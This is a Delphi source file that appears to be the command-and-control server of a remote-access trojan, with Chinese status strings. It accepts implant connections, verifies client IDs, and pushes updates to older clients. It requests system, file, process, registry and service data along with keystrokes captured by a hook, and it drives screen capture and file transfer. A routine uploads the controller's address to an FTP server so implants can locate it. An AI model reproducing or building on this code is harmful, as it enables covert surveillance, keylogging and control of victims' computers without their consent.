unit data;

interface

uses
  SysUtils, Classes, ScktComp, ExtCtrls,uTransDataSrv,func,ComCtrls,messages
  ,windows,uSocket,uStr,forms,uDebug;

type
  tflg=(ready,GetPCInfo,GetDrvs,GetFileInfos,GetProcs,GetRegInfo,GetPCName,GetHookKeys,GetSvcInfo,
        FileKeyExist,ScrExist,SearchFile,GetComInfos,SMConn,SMDisConn,SMErr,setIPServerInfo,NOPCInfo,GetVersion);
  pconn=^tconn;
  Tconn=record
    flg:tflg;
    Node:ttreeNode;
    item:tlistitem;
    data:pointer;
    size:integer;
    rcvd:integer;
  end;

  TDM = class(TDataModule)
    ss: TServerSocket;
    Timer1: TTimer;
    procedure Timer1Timer(Sender: TObject);
    procedure ssClientConnect(Sender: TObject; Socket: TCustomWinSocket);
    procedure ssClientDisconnect(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure ssClientRead(Sender: TObject; Socket: TCustomWinSocket);
    procedure ssClientError(Sender: TObject; Socket: TCustomWinSocket;
      ErrorEvent: TErrorEvent; var ErrorCode: Integer);
  private
    { Private declarations }
    procedure QueryClient;
  public
    { Public declarations }
    bQuery:bool;
    //procedure SendOrder(poh:POrdHeader);overload;
    procedure SendOrder(socket:tCustomWinSocket;order:DWORD);overload;
    procedure SendOrder(order:DWORD;pData:pointer;dwSize:DWORD);overload;
    procedure SendOrder(order:DWORD);overload;
    procedure SendOrder(order:DWORD;order2:DWORD);overload;
    function RecvBuf(socket: TCustomWinSocket;p:pointer;len:integer=-1):integer;
    function RecvNon(Socket: TCustomWinSocket;p:pointer;Recving,Recved:integer):integer;
    function SendBuf(socket: TCustomWinSocket;p:pointer;len:integer):integer;overload;
    function SendBuf(p:pointer;len:integer):integer;overload;
    //function SendString(s:string):integer;
    function SetScr(order:TScrOrder;ViewMode:byte=vmColor4):boolean;
    procedure SendPCInfoOrder();
    function InitOrdHeader(poh:POrdHeader):BOOL;
  end;

var
  DM: TDM;
  pDatas:tlist;
  CurSocket:tCustomWinSocket;
  CurPC:pconn;
  hForm:hwnd;
  Buf:array[0..MAXBUF-1] of byte;
  FilterIP:string;
  ReadConn:integer=0;
  MemConn:integer=0;
  GetPCInfoConn:integer=0;
  PostConn:integer=0;
  hEvent:DWORD;
function SetIPServer(PIPServerInfo:pointer):BOOL;stdcall;
function SendPCInfoOrderThread():BOOL;stdcall;

implementation

uses main;
{$R *.dfm}

function SendPCInfoOrderThread():BOOL;stdcall;
var
  err,i:cardinal;
  pc:pconn;
begin
  result:=false;
  hEvent:=CreateEvent(nil,false,false,nil);
  if hEvent=0 then exit;
  while true do
  begin
    err:=WaitForSingleObject(hEvent,60000);
    if err=$FFFFFFFF then exit;
    if dm.ss.Socket.ActiveConnections>0 then
    for i:=0 to dm.ss.Socket.ActiveConnections-1 do
    begin
      pc:=dm.ss.Socket.Connections[i].Data;
      if pc=nil then continue;
      if pc^.flg<>NoPCInfo then continue;
      pc^.flg:=GetPCInfo;
      dm.SendOrder(dm.ss.Socket.Connections[i],o_PCInfo);
      break;
    end;//for
  end;//while
end;
procedure tdm.SendPCInfoOrder();
var
  hd,id:cardinal;
begin
  hd:=CreateThread(nil,0,@SendPCInfoOrderThread,nil,0,id);
  closehandle(hd);
end;
function SetIPServer(PIPServerInfo:pointer):BOOL;stdcall;
label 1;
const
  MAXBUF=1024;
  //INVALID_SOCKET    = TSocket(NOT(0));
var
  pf:PIPServer;
  hSocket,hFileSocket:integer;
  FileSvr:stSvrAddr;
  Buf:array[0..MAXBUF-1] of ansiChar;
  p,httpFile:pansiChar;
  httpDir:array[0..31] of ansiChar;
begin
  result:=false;
  pf:=PIPServerInfo;
  hSocket:=INVALID_SOCKET;hFileSocket:=INVALID_SOCKET;
  p:=buf;httpFile:=GetHttpDir(pf.aFile,httpDir);
  if not ConnectServer(hSocket,pf^.svr) then goto 1;
  RecvNon(hSocket,p,MAXBUF);
  if strpos(p,'220')=nil then goto 1;

  strcopy(p,'USER ');strcat(p,pf^.user);strcat(p,#13#10);
  SendBuf(hSocket,p,strlen(p)); RecvNon(hSocket,p,MAXBUF);
  if strpos(p,'331')=nil then goto 1;

  strcopy(p,'pass ');strcat(p,pf^.pwd);strcat(p,#13#10);
  SendBuf(hSocket,p,strlen(p)); RecvNon(hSocket,p,MAXBUF);
  if strpos(p,'230')=nil then goto 1;

  strcopy(p,'CWD ');strcat(p,httpDir);strcat(p,#13#10);
  SendBuf(hSocket,p,strlen(p)); RecvNon(hSocket,p,MAXBUF);
  if strpos(p,'250')=nil then goto 1;

  strcopy(p,'TYPE I');strcat(p,#13#10);
  SendBuf(hSocket,p,strlen(p)); RecvNon(hSocket,p,MAXBUF);
  if strpos(p,'200')=nil then goto 1;

  strcopy(p,'REST 0');strcat(p,#13#10);
  SendBuf(hSocket,p,strlen(p)); RecvNon(hSocket,p,MAXBUF);
  if strpos(p,'350')=nil then goto 1;
  //DELE ip1.dat
  strcopy(p,'DELE ');strcat(p,httpFile);strcat(p,#13#10);
  SendBuf(hSocket,p,strlen(p)); RecvNon(hSocket,p,MAXBUF);
  if (strpos(p,'250')=nil)and(strpos(p,'550')=nil) then goto 1;

  strcopy(p,'PASV');strcat(p,#13#10);
  SendBuf(hSocket,p,strlen(p)); RecvNon(hSocket,p,MAXBUF);
  if strpos(p,'227')=nil then goto 1;

  FileSvr:=FTPPassiveStrToSvr(p);
  if (FileSvr.IP='') or (FileSvr.port=0) then goto 1;

  if not ConnectServer(hFileSocket,FileSvr) then goto 1;

  strcopy(p,'STOR ');strcat(p,httpFile);strcat(p,#13#10);
  SendBuf(hSocket,p,strlen(p)); RecvNon(hSocket,p,MAXBUF);
  if (strpos(p,'150')=nil) and (strpos(p,'125')=nil) then goto 1;
  p:=pansiChar(pointer(@pf^.mysvr));
  if SendBuf(hFileSocket,p,sizeof(stSvrAddr2)) then result:=true;
1:
  if hSocket<>INVALID_SOCKET then
    FreeSocket(hSocket);
  if hFileSocket<>INVALID_SOCKET then
    FreeSocket(hFileSocket);
  if result then
    pf^.svr.port:=1
  else
    pf^.svr.port:=0;
  SendMessage(hForm,wm_Conn,integer(setIPServerInfo),integer(pf));
  dispose(pf);
end;
procedure tdm.QueryClient;
var
  pc:pconn;
  i:integer;
begin
  try
    for i:=0 to ss.Socket.ActiveConnections-1 do
    begin
      pc:=ss.Socket.Connections[i].Data;
      if(pc=nil) then continue;
      if pc^.flg=ready then SendOrder(ss.socket.Connections[i],o_ready);
    end;//for
  except
  end;
end;
function tdm.SetScr(order:TScrOrder;ViewMode:byte=vmColor4):boolean;
var
  i:integer;
  TT:TThreadType;
  pTS:pTransScrCS;
begin
  result:=false;
  if assigned(pDatas) then
  for i:=0 to pDatas.Count-1 do
  begin
    TT:=TThreadType(pDatas.Items[i]^);
    case TT of
      FtransScr:
      begin
        pTS:=pDatas.Items[i];
        if order<>FScrStart then
          pTS^.order:=order;
        result:=true;
      end;
    end;//case
  end;//for
if not result then
if order=FScrStart then
begin
  SendOrder(o_Screen);
  SendBuf(@ViewMode,sizeof(ViewMode));
end;
end;
function tdm.SendBuf(p:pointer;len:integer):integer;
var
  count,i:integer;
  pp:pointer;
begin
  count:=len;
  pp:=p;
  while count>0 do
  begin
    i:=CurSocket.SendBuf(pp^,count);
    count:=count-i;
    pp:=pointer(dword(pp)+i);
  end;
  result:=len;
end;
function tdm.SendBuf(socket: TCustomWinSocket;p:pointer;len:integer):integer;
var
  count,i:integer;
  pp:pointer;
begin
  count:=len;
  pp:=p;
  while count>0 do
  begin
    i:=Socket.SendBuf(pp^,count);
    count:=count-i;
    pp:=pointer(dword(pp)+i);
  end;
  result:=len;
end;
function tdm.RecvBuf(Socket: TCustomWinSocket;p:pointer;len:integer=-1):integer;
var
  Count,i:integer;
  pp:pointer;
begin
  if len=-1 then
    Count:=socket.ReceiveLength
  else
    count:=len;
  result:=count;
  pp:=p;
  while Count>0 do
  begin
    if socket.ReceiveLength<=0 then continue;
    i:=socket.ReceiveBuf(pp^,count);
    Count:=count-i;
    pp:=pointer(dword(pp)+i);
  end;
end;
function tdm.RecvNon(Socket: TCustomWinSocket;p:pointer;Recving,Recved:integer):integer;
//06-06-08:add
begin
  if Recved<>0 then p:=pointer(dword(p)+Recved);
  result:=socket.ReceiveBuf(p^,Recving);
  if result=-1 then result:=0;
end;
procedure tdm.SendOrder(socket:tCustomWinSocket;order:DWORD);
var
  oh:stOrdHeader;
begin
  InitOrdHeader(@oh);
  oh.Order:=order;
  socket.SendBuf(oh,sizeof(stOrdHeader));
end;
procedure tdm.SendOrder(order:DWORD;order2:DWORD);
var
  oh:stOrdHeader;
begin
  if CurSocket=nil then exit;
  InitOrdHeader(@oh);
  oh.Order:=order;
  oh.DataSize:=sizeof(DWORD);
  oh.Data:=pointer(order2);
  CurSocket.SendBuf(oh,sizeof(stOrdHeader));
end;
procedure tdm.SendOrder(order:DWORD);
var
  oh:stOrdHeader;
begin
  if CurSocket=nil then exit;
  InitOrdHeader(@oh);
  oh.Order:=order;
  CurSocket.SendBuf(oh,sizeof(stOrdHeader));
end;
procedure tdm.SendOrder(order:DWORD;pData:pointer;dwSize:DWORD);
var
  oh:stOrdHeader;
begin
  if CurSocket=nil then exit;
  InitOrdHeader(@oh);
  oh.Order:=order;
  oh.DataSize:=dwSize;
  oh.Data:=pData;
  CurSocket.SendBuf(oh,sizeof(stOrdHeader));
  CurSocket.SendBuf(pData^,dwSize);
end;

procedure TDM.Timer1Timer(Sender: TObject);
var
  i:integer;
  TT:TThreadType;
  pTF:pTransFilesCS;
  pTS:pTransScrCS;
  transed,total,base:int64;
  pc:pconn;
begin
  timer1.Enabled:=false;
  base:=$FFFFFFFF;
  Fmain.memoThread.Lines.Clear;
  if assigned(pDatas) then
  for i:=0 to pDatas.Count-1 do
  begin
    TT:=TThreadType(pDatas.Items[i]^);
    case TT of
      FTransFile:
      begin
        pTF:=pDatas.Items[i];
        while(Fmain.memoThread.Lines.Count-1<i) do
        Fmain.memoThread.Lines.add('');
        //transed:=(pTF^.transRate.TransedHigh*(base+1)+pTF^.transRate.Transed) div 1024;
        transed:=pTF^.transRate.Transed div 1024;
        if pTF^.fileInfo.isUpLoad then
          total:=(pTF^.fileInfo.ClientFileSizeHigh*(base+1)+pTF^.fileInfo.ClientFileSize) div 1024
        else
          total:=(pTF^.fileInfo.FileSizeHigh*(base+1)+pTF^.fileInfo.FileSize) div 1024;
        Fmain.memoThread.Lines.Strings[i]:=extractfilename(pTF^.fileInfo.FileName)
        +#10'(已传输：'+sysutils.inttostr(transed)+'K/'+sysutils.inttostr(total)+'K; '
        +'传输率：'+sysutils.inttostr(pTF^.transRate.Speed div 1024)+'K/秒)';
        pTF^.transRate.Speed:=0;
      end;//
      FtransScr:
      begin
        pTS:=pDatas.Items[i];
        while(Fmain.memoThread.Lines.Count-1<i) do
        Fmain.memoThread.Lines.add('');
        Fmain.memoThread.Lines.Strings[i]:='图像传输'
        +'(已传输：'+sysutils.inttostr(pTS^.transRate.Transed div 1024)+'K/'+sysutils.inttostr(pTS^.transRate.TransedHigh div 1024)+'K; '
        +'传输率：'+sysutils.inttostr(pTS^.transRate.Speed div 1024)+'K/秒)';
        pTS^.transRate.Speed:=0;
      end;// FtransScr
    end;//case
  end;
  if bQuery then QueryClient;
  timer1.Enabled:=true;
end;

procedure TDM.ssClientConnect(Sender: TObject; Socket: TCustomWinSocket);

begin

  SendOrder(socket,o_GetCID);
  fmain.Bar1.Panels[2].Text:='总连接数：'+sysutils.IntToStr(ss.Socket.ActiveConnections)
    +'读入连接：'+sysutils.IntToStr(ReadConn)
    +'内存连接：'+sysutils.IntToStr(MemConn)
    +'信息连接：'+sysutils.IntToStr(GetPCInfoConn)
    +'处理连接：'+sysutils.IntToStr(PostConn);
end;

procedure TDM.ssClientDisconnect(Sender: TObject;
  Socket: TCustomWinSocket);
var
  pc:pconn;
begin
  fmain.Bar1.Panels[2].Text:='总连接数：'+sysutils.IntToStr(ss.Socket.ActiveConnections)
    +'读入连接：'+sysutils.IntToStr(ReadConn)
    +'内存连接：'+sysutils.IntToStr(MemConn)
    +'信息连接：'+sysutils.IntToStr(GetPCInfoConn)
    +'处理连接：'+sysutils.IntToStr(PostConn);
  pc:=Socket.Data;
  if pc=nil then exit;
  SendMessage(hForm,wm_Conn,integer(SMDisConn),integer(Socket));
end;

procedure TDM.ssClientRead(Sender: TObject; Socket: TCustomWinSocket);
//06-05-13:pc=nil处理
var
  pc:pconn;
  oh:stOrdHeader;
  iRet:integer;
  ci:stClientInfo;
begin
  pc:=Socket.data;
  if pc=nil then uDebug.Log('GetFileInfos test pc=nil');
  if pc=nil then
  begin
    if(socket.ReceiveLength>=sizeof(stClientInfo)) then
    begin
      RecvBuf(socket,@ci,sizeof(stClientInfo));
      //验证CID
      if(ci.ID=con_ID) then
      begin
        InitOrdHeader(@oh);
        //验证版本：
        if(ci.Version=con_VERSION) then
        begin
          //分配内存
          MemConn:=Memconn+1;
          new(pc);
          zeromemory(pc,sizeof(tconn));
          pc^.flg:=GetPCInfo;
          socket.Data:=pc;
          PostMessage(hForm,wm_Conn,integer(SMConn),integer(Socket));
          //oh.Order:=o_PCInfo;
          //SendOrder(socket,@oh);
        end;
        if(ci.Version<con_VERSION) then
        begin
          SendOrder(socket,o_Update);
        end;// if(ci.Version<con_VERSION) then
      end //if(ci.ID=con_ID) then
      else begin
        socket.ReceiveBuf(ci,sizeof(ci));
      end;//if(ci.ID=con_ID) then
    end//if(socket.ReceiveLength>=8) then
    else begin
      socket.ReceiveBuf(ci,sizeof(ci));
    end;//if(socket.ReceiveLength>=8) then
    exit;
  end;//nil
  uDebug.Log('GetFileInfos test flg:%d:',[DWORD(pc^.flg)]);
  case pc^.flg of
  Ready:
    begin

    end;
  GetPCInfo:
    begin
    {
      if socket.ReceiveLength=0 then exit;
      GetPCInfoConn:=GetPCInfoConn+1;
      if(pc^.size=0) then
      begin
        RecvBuf(socket,@pc^.size,sizeof(pc^.size));
        getmem(pc^.data,pc^.size);
        zeromemory(pc^.data,pc^.size);
      end;
      pc^.rcvd:=pc^.rcvd+RecvNon(socket,pc^.data,pc^.size,pc^.rcvd);
      if pc^.rcvd=pc^.size then
      begin
        PostMessage(hForm,wm_Conn,integer(GetPCInfo),integer(Socket));
        pc^.flg:=Ready;
      end;
      //freemem(pc^.data,pc^.size);
      //SetEvent(hEvent);
      }
    end;//
  GetDrvs:
    begin
    {
      pc^.flg:=Ready;
      RecvBuf(socket,@pc^.size,sizeof(pc^.size));
      getmem(pc^.data,pc^.size);
      zeromemory(pc^.data,pc^.size);
      RecvBuf(socket,pc^.data,pc^.size);
      SendMessage(hForm,wm_Conn,integer(GetDrvs),integer(Socket));
      freemem(pc^.data,pc^.size);
      }
    end;//GetDrvs
  GetFileInfos:
    begin
    {
      pc^.flg:=ready;
      uDebug.Log('GetFileInfos start:');
      iRet:=Recvbuf(socket,@pc^.size,sizeof(pc^.size));
      Log('GetFileInfos Size:%d:',[iRet]);
      //dm.ss.
      if pc^.size=0 then
      begin
        SendMessage(hForm,wm_Conn,integer(GetFileInfos),integer(Socket));
        exit;
      end;
      getmem(pc^.data,pc^.size);
      zeromemory(pc^.data,pc^.size);
      RecvBuf(socket,pc^.data,pc^.size);
      uDebug.Log('GetFileInfos RecvBuf:%d:',[pc^.size]);
      SendMessage(hForm,wm_Conn,integer(GetFileInfos),integer(Socket));
      freemem(pc^.data,pc^.size);
      }
    end;//GetFileInfos
  GetProcs:
    begin
    {
      pc^.flg:=ready;
      Recvbuf(socket,@pc^.size,sizeof(pc^.size));
      getmem(pc^.data,pc^.size);
      zeromemory(pc^.data,pc^.size);
      RecvBuf(socket,pc^.data,pc^.size);
      SendMessage(hForm,wm_Conn,integer(GetProcs),integer(Socket));
      freemem(pc^.data,pc^.size);
      }
    end;//GetProcs
  GetRegInfo:
    begin
    {
      pc^.flg:=ready;
      Recvbuf(socket,@pc^.size,sizeof(pc^.size));
      if pc^.size=0 then exit;
      getmem(pc^.data,pc^.size);
      zeromemory(pc^.data,pc^.size);
      RecvBuf(socket,pc^.data,pc^.size);
      SendMessage(hForm,wm_Conn,integer(GetRegInfo),integer(Socket));
      freemem(pc^.data,pc^.size);
      }
    end;//GetRegInfo
  GetPCName:
    begin
    {
      pc^.flg:=ready;
      Recvbuf(socket,@pc^.size,sizeof(pc^.size));
      if pc^.size=0 then exit;
      getmem(pc^.data,pc^.size+1);
      zeromemory(pc^.data,pc^.size+1);
      RecvBuf(socket,pc^.data,pc^.size);
      SendMessage(hForm,wm_Conn,integer(GetPCName),integer(Socket));
      freemem(pc^.data,pc^.size+1);
      }
    end;  //GetPCName:
  GetHookKeys:
    begin
    {
      pc^.flg:=ready;
      Recvbuf(socket,@pc^.size,sizeof(pc^.size));
      if pc^.size=0 then exit;
      getmem(pc^.data,pc^.size+1);
      zeromemory(pc^.data,pc^.size+1);
      RecvBuf(socket,pc^.data,pc^.size);
      SendMessage(hForm,wm_Conn,integer(GetHookKeys),integer(Socket));
      freemem(pc^.data,pc^.size+1);
      }
    end;//GetHookKeys
  GetSvcInfo:
    begin
    {
      pc^.flg:=ready;
      Recvbuf(socket,@pc^.size,sizeof(pc^.size));
      if pc^.size=0 then exit;
      getmem(pc^.data,pc^.size);
      zeromemory(pc^.data,pc^.size);
      RecvBuf(socket,pc^.data,pc^.size);
      SendMessage(hForm,wm_Conn,integer(GetSvcInfo),integer(Socket));
      freemem(pc^.data,pc^.size);
      }
    end;//GetRegInfo
  end;//case
end;

procedure TDM.ssClientError(Sender: TObject; Socket: TCustomWinSocket;
  ErrorEvent: TErrorEvent; var ErrorCode: Integer);
begin
  SendMessage(hForm,wm_Conn,integer(SMErr),integer(Socket));
  errorCode:=0;
  socket.Close;
end;
//--------------------------------------------------------------------
function TDM.InitOrdHeader(poh:POrdHeader):BOOL;
begin
  ZeroMemory(poh,sizeof(stOrdHeader));
  poh^.Version:=con_CON_VER;
  poh^.Encrpt:=con_Encrpt;
  result:=true;
end;

end.
